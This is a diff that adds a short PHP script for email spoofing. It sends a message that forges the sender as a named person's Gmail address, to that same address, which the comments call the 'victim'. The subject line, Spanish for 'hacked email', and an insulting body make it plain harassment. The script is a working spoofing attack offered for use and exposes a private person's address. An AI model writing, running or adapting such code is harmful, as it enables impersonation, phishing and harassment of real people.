@@ -1,0 +1,19 @@
+<?php
+
+$to = "gabyolocampo@gmail.com"; //victim's email to whom you want to send an email
+
+$subject = "correo hackeado";
+
+$message = "tonta";
+
+$from = "gabyolocampo@gmail.com"; // victim's email from whom you want to send an email
+
+$headers = "From:" . $from;
+
+$mail = mail($to,$subject,$message,$headers,$from); // this mail() will do our spoofing work
+
+if($mail) 
+{
+echo "Email sent to ".$to;
+}
+?>
